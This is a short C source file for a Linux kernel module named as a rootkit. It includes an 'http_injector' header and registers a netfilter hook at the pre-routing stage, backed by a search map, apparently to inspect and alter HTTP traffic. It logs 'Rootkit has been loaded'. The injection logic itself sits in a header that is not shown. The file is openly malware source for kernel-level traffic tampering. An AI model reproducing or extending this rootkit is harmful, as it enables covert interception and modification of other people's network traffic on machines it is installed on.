#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "http_injector.h"

MODULE_LICENSE("GPL");

struct nf_hook_ops nfho = {
      .hook        = http_nf_hookfn,
      .hooknum     = NF_INET_LOCAL_OUT,
      .pf          = PF_INET,
      .priority    = NF_IP_PRI_FIRST
};

static int rootkit_init(void) {
    int success;
    

    nfho.hooknum = NF_INET_PRE_ROUTING; 
    nfho.priv = init_search_map();
    fill_search_dict((search_map_t *)nfho.priv);

    success = nf_register_net_hook(&init_net, &nfho);

    // success = success && my_func(...)
    printk(KERN_INFO "Rootkit has been loaded\n");

    return success;
}

static void rootkit_exit(void) {
    search_map_t *map = (search_map_t *)nfho.priv;

    printk(KERN_INFO "Rootkit has been unloaded\n");

    free_search_map(map);
    nf_unregister_net_hook(&init_net, &nfho);
}

module_init(rootkit_init);
module_exit(rootkit_exit);